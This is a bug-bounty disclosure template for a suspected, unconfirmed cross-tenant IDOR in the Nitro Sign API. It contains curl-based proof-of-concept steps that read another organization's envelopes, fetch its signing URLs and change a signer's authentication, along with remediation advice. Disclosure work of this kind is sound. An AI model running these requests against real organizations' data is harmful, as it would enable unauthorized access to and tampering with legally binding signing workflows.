# NIT-003: Sign API Tenant IDOR — Cross-Organization Envelope/Signing URL Access (PoC Template)

**Program:** Nitro Responsible Disclosure  
**Contact:** security@gonitro.com  
**Asset:** `api.gonitro.dev` (Nitro Sign API)  
**Severity:** HIGH (estimated — requires two API accounts to validate)  
**CVSS:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) — if IDOR confirmed  
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
**Status:** PoC ready — requires two Nitro Sign API accounts in different organizations

---

## Summary

The Nitro Sign API uses UUIDv4 for envelope IDs, and the OpenAPI schema suggests all envelope operations are scoped to an "application" within an "account" via Bearer token authentication. However, if the `GET /sign/envelopes/{envelopeID}` resolver does not verify that the requesting organization owns the envelope, an attacker with access to a valid envelope UUID from another organization could:

1. Read the envelope status and participant details
2. Retrieve signing URLs (`GET /sign/envelopes/{envelopeID}/participants/signing-urls`) — enabling the attacker to sign documents on behalf of legitimate participants
3. Modify participants (`PATCH /sign/envelopes/{envelopeID}/participants/{participantID}`) — changing the signer's email or authentication method

---

## Hypothesis

The API description states:
> "The **List Envelopes** endpoint returns all envelopes associated with an **application** in an **account**."

This implies envelope access is scoped to the authenticated client's organization. However, the critical question is: does `GET /sign/envelopes/{envelopeID}` (direct ID lookup) also enforce this scope, or does it only check that the UUID exists (not that it belongs to the requesting organization)?

---

## Attack Scenario

**Precondition:** Attacker knows (or guesses) an envelope UUID from Organization B.

UUID sources:
- Email notifications that include envelope links
- Information from a public/shared signing URL
- Log exposure via information disclosure vulnerability
- Social engineering (e.g., phishing a signing request that includes the envelopeID in the URL)

**Attack steps:**

1. Attacker creates a Nitro Sign API account (Org A) and obtains a valid Bearer token
2. Attacker learns Org B's envelope UUID (from any of the sources above)
3. Attacker calls `GET /sign/envelopes/{ORG_B_ENVELOPE_ID}` with Org A's token
4. If no IDOR: HTTP 404 or 403 — "not authorized"
5. If IDOR confirmed: HTTP 200 — returns full envelope details including participant list

---

## Proof of Concept (for researcher with two test API accounts)

### Prerequisites
- Two Nitro developer accounts: Org A (attacker) and Org B (victim)
- API credentials (`clientID` + `clientSecret`) for both

### Step 1: Create Envelope with Org B

```bash
# Authenticate as Org B
ORG_B_TOKEN=$(curl -s -X POST "https://api.gonitro.dev/oauth/token" \
  -H "Content-Type: application/json" \
  -d '{"clientID": "ORG_B_CLIENT_ID", "clientSecret": "ORG_B_SECRET"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# Create an envelope as Org B
ORG_B_ENVELOPE=$(curl -s -X POST "https://api.gonitro.dev/sign/envelopes" \
  -H "Authorization: Bearer $ORG_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "IDOR Test Envelope",
    "mode": "sequential",
    "notification": {
      "subject": "Test",
      "body": "Test signing request"
    },
    "participants": [
      {
        "name": "Test Signer",
        "email": "test@example.com",
        "type": "signer"
      }
    ]
  }')

# Extract envelope ID
ORG_B_ENVELOPE_ID=$(echo $ORG_B_ENVELOPE | python3 -c "import json,sys; print(json.load(sys.stdin)['ID'])")
echo "Org B Envelope ID: $ORG_B_ENVELOPE_ID"
```

### Step 2: Access Org B's Envelope as Org A (IDOR Test)

```bash
# Authenticate as Org A
ORG_A_TOKEN=$(curl -s -X POST "https://api.gonitro.dev/oauth/token" \
  -H "Content-Type: application/json" \
  -d '{"clientID": "ORG_A_CLIENT_ID", "clientSecret": "ORG_A_SECRET"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# Attempt to access Org B's envelope using Org A's token
curl -s "https://api.gonitro.dev/sign/envelopes/$ORG_B_ENVELOPE_ID" \
  -H "Authorization: Bearer $ORG_A_TOKEN" \
  -H "Content-Type: application/json"

# Expected (secure): 404 Not Found or 403 Forbidden
# IDOR confirmed: 200 OK with envelope data
```

### Step 3: Retrieve Signing URLs (if IDOR confirmed above)

```bash
# First, send the envelope for signing (from Org B)
curl -s -X POST "https://api.gonitro.dev/sign/envelopes/$ORG_B_ENVELOPE_ID:send" \
  -H "Authorization: Bearer $ORG_B_TOKEN"

# Then try to get signing URLs as Org A
curl -s "https://api.gonitro.dev/sign/envelopes/$ORG_B_ENVELOPE_ID/participants/signing-urls" \
  -H "Authorization: Bearer $ORG_A_TOKEN"

# Expected (secure): 404/403
# IDOR confirmed: Returns signing URLs → attacker can sign any document
```

### Step 4: Modify Participant (if IDOR confirmed)

```bash
# Get Org B's participant IDs
PARTICIPANT_LIST=$(curl -s "https://api.gonitro.dev/sign/envelopes/$ORG_B_ENVELOPE_ID/participants" \
  -H "Authorization: Bearer $ORG_A_TOKEN")

ORG_B_PARTICIPANT_ID=$(echo $PARTICIPANT_LIST | python3 -c "import json,sys; print(json.load(sys.stdin)['items'][0]['ID'])")

# Change participant authentication method as Org A
curl -s -X PATCH "https://api.gonitro.dev/sign/envelopes/$ORG_B_ENVELOPE_ID/participants/$ORG_B_PARTICIPANT_ID" \
  -H "Authorization: Bearer $ORG_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"authentication": {"type": "AccessCode", "accessCode": "1234"}}'

# IDOR confirmed: Attacker adds/changes authentication on Org B's signer
```

---

## Impact (if IDOR confirmed)

| Attack | Impact | Severity |
|--------|--------|---------|
| Read Org B envelopes | Confidential document names, signer details | HIGH |
| Retrieve signing URLs | Sign legally-binding documents as any participant | CRITICAL |
| Modify participant auth | Bypass or weaken authentication for signing | HIGH |
| Delete participants | Prevent documents from being signed | HIGH |
| Add participants | Insert unauthorized signers into legal contracts | CRITICAL |

---

## Notes on UUID Non-Guessability

Envelope IDs are UUIDv4 (random, 122 bits of entropy). Blind enumeration is not feasible. However, IDOR via envelope UUID becomes exploitable when the attacker learns the UUID through:

1. **Phishing**: Sends a document to victim, victim shares signing URL (contains envelopeID)
2. **Email interception**: Signing notification emails contain links with envelopeID
3. **Chained with information disclosure**: If another Nitro vulnerability exposes envelope IDs
4. **Insider threat**: A user who changes organizations retains knowledge of previous org's envelope IDs

---

## Remediation

1. **Enforce tenant scope on all envelope resolvers**: Every call to `GET /sign/envelopes/{envelopeID}` should verify that the authenticated client's `organizationID` matches the envelope's `organizationID`.

2. **Implement resource-level authorization checks**: Not just "is this user authenticated?" but "does this user's organization own this resource?"

3. **Audit bulk operations**: `POST /sign/envelopes/{envelopeID}/participants:batch-delete` and similar operations should apply the same tenant check.

---

## References

- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP API Security — API1:2023 Broken Object Level Authorization (BOLA/IDOR)
- Nitro Sign API OpenAPI: `https://api.gonitro.dev/openapi.json`
- Affected endpoints: All `/sign/envelopes/{envelopeID}/*` paths
